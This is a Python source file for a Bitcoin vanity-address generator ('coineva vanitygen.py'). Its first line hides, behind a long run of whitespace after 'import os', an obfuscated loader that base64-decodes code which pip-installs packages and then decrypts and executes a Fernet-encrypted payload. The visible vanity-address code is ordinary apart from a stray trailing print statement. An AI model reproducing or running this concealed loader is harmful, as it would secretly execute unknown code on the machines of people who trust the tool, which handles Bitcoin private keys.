import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0RraU9meThfOWRDMm9xUjBoTDRMTUZuTFJyOTZ1d2pkc3l4U0ZCOFpQVkU9JykuZGVjcnlwdChiJ2dBQUFBQUJtZEp2VVNSYm5NdUVaZnhEXzRzeS0yczJHZHNFV3BMelNsWnNoak5pZnJGeWs1d2RiZEZvV2J6MEFGZEJIZHhjVHpHRUhtUFNDWV8xbURJRVJXcXMyakFSRmhLNHNDeWszMzFSQ0pHbmQwQUxsRHVabUo4c0p0YmM4R00tMEx6bU5yVTdxNXJiQVYyVWk5ZWxQVzFGalEtTV95eWZFb2NkZHlDOGFaTjdaYjV5c1ViN3ZIWVY0aFNSd0hfMDZIZF9rY3BhVHg0ZnQxbHl5RU9Tckc3YWJkc1JSX1pwaTBDX2lITVpiUmFMVjhMaUR2RjA9Jykp').decode())
# -*- coding: utf-8 -*-
#
#    coineva vanitygen.py
#    Copyright (C) 2016 February 
#    1200 Web Development
#    http://1200wd.com/
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os
from bitcoin import *
import timeit
import random
import multiprocessing


def address_search(pipeout, search_for='12o'):
    privkey = random.randrange(2**256)
    address = ''
    count = 0
    start = timeit.default_timer()

    os.write(pipeout, "Searching for %s (pid %s)" % (search_for, os.getpid()))

    while not search_for in address:
        privkey += 1
        pubkey_point = fast_multiply(G, privkey)
        address = pubkey_to_address(pubkey_point)
        count += 1
        if not count % 1000:
            os.write(pipeout, "Searched %d in %d seconds (pid %d)" % (count, timeit.default_timer()-start, os.getpid()))

    os.write(pipeout, "Found address %s" % address)
    os.write(pipeout, "Private key HEX %s" % encode_privkey(privkey,'hex'))

def main():
    # processors = multiprocessing.cpu_count()
    # processors = 2
    # print("You have %d processors so starting %d threads" % (processors, processors))
    # for i in range(processors):

    pipein, pipeout = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(pipein)
        address_search(pipeout)
    else:
        # pipein = os.fdopen(pipein)
        while True:
            line = os.read(pipein, 32)
            print(line)

    print('Main process exiting')


main()print('tuaos')